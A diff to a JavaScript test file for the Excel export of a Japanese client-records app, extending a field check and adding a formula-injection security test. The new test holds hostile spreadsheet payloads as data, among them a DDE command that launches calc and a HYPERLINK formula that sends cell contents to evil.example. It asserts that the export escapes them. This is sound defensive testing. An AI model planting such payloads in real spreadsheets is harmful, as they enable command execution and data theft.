@@ -99,13 +99,22 @@ describe('export.js: Excel書き出し（基本情報/カウンセリングシ�
     assert.deepEqual([...wb.SheetNames], ['基本情報', 'カウンセリングシート', '同意書', 'カルテ']);
   });
 
-  test('基本情報シートに顧客データが入る', async () => {
-    const c = newClient({ name: '山田太郎', kana: 'ヤマダ', goal: '減量5kg' });
+  test('基本情報シートに顧客データ（会員ID・緊急連絡先・かかりつけ医を含む）が入る', async () => {
+    const c = newClient({
+      name: '山田太郎', kana: 'ヤマダ', goal: '減量5kg', memberId: 'M00042',
+      emergencyName: '山田花子', emergencyRelation: '配偶者', emergencyPhone: '09011112222',
+      doctor: '〇〇病院',
+    });
     await saveClient(c);
     const wb = await readSheets(c);
     const rows = XLSX.utils.sheet_to_json(wb.Sheets['基本情報'], { header: 1 });
+    assert.ok(rows.some((r) => r[0] === '会員ID' && r[1] === 'M00042'));
     assert.ok(rows.some((r) => r[0] === '氏名' && r[1] === '山田太郎'));
     assert.ok(rows.some((r) => r[0] === '目標' && r[1] === '減量5kg'));
+    assert.ok(rows.some((r) => r[0] === '緊急連絡先（氏名）' && r[1] === '山田花子'));
+    assert.ok(rows.some((r) => r[0] === '緊急連絡先（続柄）' && r[1] === '配偶者'));
+    assert.ok(rows.some((r) => r[0] === '緊急連絡先（電話）' && r[1] === '09011112222'));
+    assert.ok(rows.some((r) => r[0] === 'かかりつけ医・病院' && r[1] === '〇〇病院'));
   });
 
   test('未作成のカウンセリング/同意書は案内メッセージになる', async () => {
@@ -166,5 +175,33 @@ describe('export.js: Excel書き出し（基本情報/カウンセリングシ�
     const filename = await exportClientXlsx(c);
     assert.ok(filename.endsWith('.xlsx'));
     assert.doesNotMatch(filename, /[/:?]/);
+  });
+
+  test('セキュリティ: "=" 等で始まる値は数式として解釈されないよう無害化される', async () => {
+    const c = newClient({ name: '山田太郎', memo: '=cmd|"/c calc"!A1' });
+    await saveClient(c);
+    const ch = await createChart(c.id, 'karte');
+    const page = ch.pages.find((p) => p.name === '本日の記録');
+    page.values.memo = '+HYPERLINK("http://evil.example/steal?d="&A1)';
+    const menuPage = ch.pages.find((p) => p.name === 'メニュー・測定記録');
+    menuPage.values.items = [{ name: '-2+3+cmd', value: '@SUM(1)', reps: '', note: '' }];
+    await (await import('../js/store.js')).saveChart(ch);
+
+    const wb = await readSheets(c);
+    const infoRows = XLSX.utils.sheet_to_json(wb.Sheets['基本情報'], { header: 1 });
+    const memoRow = infoRows.find((r) => r[0] === '備考');
+    assert.equal(memoRow[1], "'=cmd|\"/c calc\"!A1");
+    assert.ok(!memoRow[1].startsWith('=cmd'));
+
+    const karteRows = XLSX.utils.sheet_to_json(wb.Sheets['カルテ'], { header: 1 });
+    assert.ok(karteRows.some((r) => r[1] === "'+HYPERLINK(\"http://evil.example/steal?d=\"&A1)"));
+    assert.ok(karteRows.some((r) => r[0] === "'-2+3+cmd"));
+    assert.ok(karteRows.some((r) => r[1] === "'@SUM(1)"));
+
+    // セルの実体が数式(f)ではなく文字列(s)として保存されていることも確認する
+    const sheet = wb.Sheets['基本情報'];
+    const memoCellRef = Object.keys(sheet).find((k) => sheet[k].v === "'=cmd|\"/c calc\"!A1");
+    assert.equal(sheet[memoCellRef].t, 's');
+    assert.equal(sheet[memoCellRef].f, undefined);
   });
 });
